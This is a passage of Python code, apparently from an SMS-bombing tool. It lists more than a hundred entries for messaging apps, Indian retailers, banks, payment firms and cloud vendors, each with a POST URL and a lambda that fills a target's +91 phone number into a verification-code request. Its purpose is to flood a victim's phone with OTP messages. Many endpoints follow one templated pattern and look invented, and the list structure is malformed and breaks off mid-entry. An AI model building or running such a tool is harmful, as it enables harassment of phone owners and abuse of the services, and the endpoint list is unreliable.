        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://business.whatsapp.com/send-verification-code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"91{phone}"}}'
    },
    {
        'name': 'Signal_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.signal.org/v1/accounts/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","region":"IN"}}'
    },
    {
        'name': 'Discord_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://discord.com/api/v9/auth/phone/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","country":"IN"}}'
    },
    {
        'name': 'Twitter_X_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://x.com/i/api/1.1/account/phone/verification_code.json',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}"}}'
    },
    {
        'name': 'Telegram_X_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://telegram.org/auth/send_code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","api_id":"12345"}}'
    }
]
# 26
{
    'name': 'Microsoft_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://login.microsoftonline.com/common/phone/sendcode',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"+91{phone}","country":"IN"}}'
},
# 27
{
    'name': 'Apple_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://appleid.apple.com/auth/verify/phone',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"+91{phone}","countryCode":"91"}}'
},
# 28
{
    'name': 'Amazon_Login_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://www.amazon.in/ap/signin',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"mobileNumber":"{phone}","countryCode":"91","type":"login"}}'
},
{
    'name': 'Myntra_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://www.myntra.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 30
{
    'name': 'Flipkart_Grocery_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://grocery.flipkart.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 31
{
    'name': 'Nykaa_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nykaa.com/auth/v1/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","country":"IN"}}'
},
# 32
{
    'name': 'Ola_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.olacabs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 33
{
    'name': 'Rapido_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rapido.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 34
{
    'name': 'Oyo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.oyorooms.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 35
{
    'name': 'MakeMyTrip_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.makemytrip.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 36
{
    'name': 'Goibibo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.goibibo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 37
{
    'name': 'BookMyShow_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bookmyshow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 38
{
    'name': 'PVR_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pvrcinemas.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 39
{
    'name': 'INOX_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.inoxmovies.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Cinepolis_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cinepolis.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 41
{
    'name': 'BigBasket_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bigbasket.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 42
{
    'name': 'Grofers_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.grofers.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 43
{
    'name': 'Zepto_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zepto.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 44
{
    'name': 'Blinkit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.blinkit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 45
{
    'name': 'Instamart_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.instamart.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 46
{
    'name': 'Dunzo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dunzo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 47
{
    'name': 'Swiggy_Instamart_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.swiggy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 48
{
    'name': 'Zomato_Pro_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zomato.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 49
{
    'name': 'EatSure_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.eatsure.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Faasos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.faasos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 51
{
    'name': 'KFC_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kfc.co.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 52
{
    'name': 'McDonalds_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mcdonalds.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 53
{
    'name': 'BurgerKing_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.burgerking.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 54
{
    'name': 'Dominos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dominos.co.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 55
{
    'name': 'PizzaHut_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pizzahut.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 56
{
    'name': 'TacoBell_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tacobell.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Subway_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.subway.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 58
{
    'name': 'Starbucks_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.starbucks.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 59
{
    'name': 'CostaCoffee_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.costacoffee.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 60
{
    'name': 'Barista_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.barista.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 61
{
    'name': 'HDFC_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hdfcbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 62
{
    'name': 'ICICI_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.icicibank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 63
{
    'name': 'SBI_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sbi.co.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 64
{
    'name': 'Axis_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.axisbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 65
{
    'name': 'Kotak_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kotakbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 66
{
    'name': 'Yes_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.yesbank.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 67
{
    'name': 'IndusInd_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.indusind.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 68
{
    'name': 'RBL_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rblbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 69
{
    'name': 'PNB_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pnb.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 70
{
    'name': 'BOB_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bankofbaroda.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 71
{
    'name': 'Canara_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.canarabank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 72
{
    'name': 'Union_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.unionbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 73
{
    'name': 'IDFC_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.idfcbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 74
{
    'name': 'Federal_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.federalbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'DBS_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dbs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 76
{
    'name': 'HSBC_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hsbc.co.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 77
{
    'name': 'Citibank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.citibank.co.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 78
{
    'name': 'PayPal_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.paypal.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 79
{
    'name': 'Venmo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.venmo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 80
{
    'name': 'Stripe_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.stripe.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 81
{
    'name': 'Razorpay_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.razorpay.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 82
{
    'name': 'CASHFREE_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cashfree.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 83
{
    'name': 'PayU_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.payu.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 84
{
    'name': 'BillDesk_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.billdesk.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 85
{
    'name': 'CCAvenue_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ccavenue.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Instamojo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.instamojo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 87
{
    'name': 'UPI_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.upi.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 88
{
    'name': 'BHIM_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bhim.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 89
{
    'name': 'NPCI_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.npci.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 90
{
    'name': 'RuPay_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rupay.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 91
{
    'name': 'Visa_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.visa.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 92
{
    'name': 'Mastercard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mastercard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 93
{
    'name': 'AmericanExpress_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.americanexpress.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Discover_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.discover.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 95
{
    'name': 'DinersClub_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dinersclub.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 96
{
    'name': 'Google_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://cloud.google.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 97
{
    'name': 'AWS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://aws.amazon.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 98
{
    'name': 'Azure_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://azure.microsoft.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 99
{
    'name': 'Oracle_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.oracle.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 100
{
    'name': 'IBM_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ibm.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 101
{
    'name': 'SAP_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sap.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 102
{
    'name': 'Salesforce_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.salesforce.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 103
{
    'name': 'HubSpot_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hubspot.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 104
{
    'name': 'Zoho_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zoho.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 105
{
    'name': 'Freshworks_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.freshworks.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'ServiceNow_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.servicenow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 107
{
    'name': 'Atlassian_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.atlassian.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 108
{
    'name': 'Slack_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.slack.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 109
{
    'name': 'Zoom_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zoom.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 110
{
    'name': 'Microsoft_Teams_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.teams.microsoft.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 111
{
    'name': 'Google_Meet_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.meet.google.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 112
{
    'name': 'Cisco_Webex_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.webex.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 113
{
    'name': 'Adobe_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.adobe.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Figma_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.figma.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 115
{
    'name': 'Canva_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.canva.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 116
{
    'name': 'Sketch_SMS',
    'type': 'sms',
